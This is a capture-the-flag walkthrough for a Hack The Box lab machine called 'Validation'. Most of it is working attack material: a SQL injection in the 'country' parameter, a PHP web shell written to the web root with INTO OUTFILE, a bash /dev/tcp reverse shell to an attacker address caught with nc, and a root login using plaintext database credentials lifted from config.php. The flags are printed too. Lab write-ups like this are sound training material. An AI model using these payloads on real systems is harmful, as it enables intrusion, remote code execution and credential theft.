![Trick.PNG](/assets/Validation/Validation.png)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.116
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.116
```

**Output**
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4566/tcp open  kwtc
8080/tcp open  http-proxy
```

3. Visit web page

![web.PNG](/assets/Validation/web.PNG)


4. Analyze the petition with **BurpSuite**

![petition.PNG](/assets/Validation/petition.PNG)


5. The field to inject sql in `username=test&country=Brazil` is `country=Brazil`


6. In this case we need to create a file in the server and execute this, you can create a **revshell.php**

* If you create a file you need to put `/var/www/html` before

Example:

```sql
username=test&country=Brazil' union select "test" into outfile "/var/www/html/test.txt"
```

---

You can access to this file in url like this

![url.PNG](/assets/Validation/url.PNG)


7. Create a malicious php file to after can get access a rev shell
```bash
username=est&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/rev.php"-- -
```

8. Yep!, you can execute commands

![cmd.PNG](/assets/Validation/cmd.PNG)

9. Execute a command to get a **reverse shell** and listen with **nc**

* In head of petition add this:
```bash
GET /rev.php?cmd=bash%20-c%20%27bash%20-i%20%3E&%20/dev/tcp/10.10.14.12/443%200%3E&1%27 HTTP/1.1
```

* The command to execute is `bash -c 'bash -i >& /dev/tcp/<vpn>/443 0>&1'`, but, in the petition is urlencode.


10. You access to target machine
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Validation]
└─| nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.116] 60628
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ 
```

11. Cat a **user flag**
```bash
www-data@validation:/home/htb$ pwd
pwd
/home/htb
www-data@validation:/home/htb$ cat user.txt
cat user.txt
9b1aa7e011a593c30f2e92019a3ca2a2
```


12. In path `/var/www/html` read a **config.php** file (Sometimes this file contains credentials in plain text)
    
```bash
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

13. Try to connect to root with this password
```bash
www-data@validation:/var/www/html$ su root
su root
Password: uhc-9qual-global-pw
whoami
root
```

14. Read **root flag** in path `/root`
```bash
cat root.txt
6f4e5e15a2133fa1c07f39364cf10601
```